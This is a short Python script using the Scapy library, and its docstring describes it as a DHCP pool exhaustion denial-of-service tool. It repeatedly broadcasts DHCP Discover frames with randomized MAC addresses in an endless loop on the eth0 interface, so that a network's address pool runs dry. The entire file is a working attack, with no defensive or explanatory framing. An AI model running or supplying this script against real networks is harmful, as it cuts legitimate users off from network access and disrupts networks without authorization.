#!/usr/bin/env python3.11
"""
This Module Is To Perform DHCP Exhaustion of Address Pool (DOS)
"""
from scapy.all import conf, sendp, RandMAC
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.l2 import Ether
import scapy # Additional line, it exists just in case.

# Disable IP address checking by Scapy
conf.checkIPaddr = False

# Create a DHCP Discover message frame
dhcp_discover_message_frame = (
    Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC())
    / IP(src="0.0.0.0", dst="255.255.255.255")
    / UDP(sport=68, dport=67)
    / BOOTP(op=1, chaddr=RandMAC())
    / DHCP(options=[("message-type", "discover"), ("end",)])
)

# Send the DHCP Discover message frame in a loop
sendp(dhcp_discover_message_frame, iface="eth0", loop=1, verbose=True)
